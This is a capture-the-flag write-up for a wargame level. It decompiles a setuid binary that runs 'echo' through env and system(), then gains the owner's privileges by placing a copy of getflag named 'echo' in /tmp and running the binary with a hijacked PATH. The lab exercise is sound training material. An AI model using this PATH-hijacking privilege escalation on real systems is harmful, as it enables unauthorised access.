# Level 03

## Initial Context

- A single executable file: `level03`

## Solving the Challenge

### Analyzing

Running the executable file show:

```bash
$ ./level03
Exploit me
```

So let's decompile the file to see what is inside:

```c
int main()
{
    gid_t gid = getegid();
    uid_t uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    return (system("/usr/bin/env echo Exploit me"));
}
```

The `man`ual can tell us:
- `setresgid(rgid, egid, sgid)`: sets the real GID, effective GID, and saved set-group-ID of the calling process.
- `getgid()`: returns the effective group ID of the calling process.

The `u` (or user) versions are the same but for users instead of groups. (`getegid()` and `setresuid(ruid, euid, suid)`)

Using these means that we can elevate privileges of the current process to inherit permission of another group.

```bash
$ ls -la level03
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

We can see that the group permission has a `s` instead of a `x`. Allowing a caller to elevate the process to `flag03`'s group permissions. Basically running the process as him.

### Exploiting

By creating an executable named `echo` and adding it to the path, the process will execute it with the same privileges as `flag03`.

If this process is `getflag`, we should get the flag.

`level03` user cannot write anywhere (not even in his own home), and cannot even `ls` the `/tmp` directory. Creating a custom directory and copying `getflag` as `echo` in it should do the trick.

```bash
$ mkdir /tmp/level03
$ cp $(which getflag) /tmp/level03/echo
```

Then run the executable with a custom path:

```bash
$ PATH=/tmp/level03 ./level03
Check flag.Here is your token : ....
```

**Success!**

For this level there is no flag, but we have the password for the next level.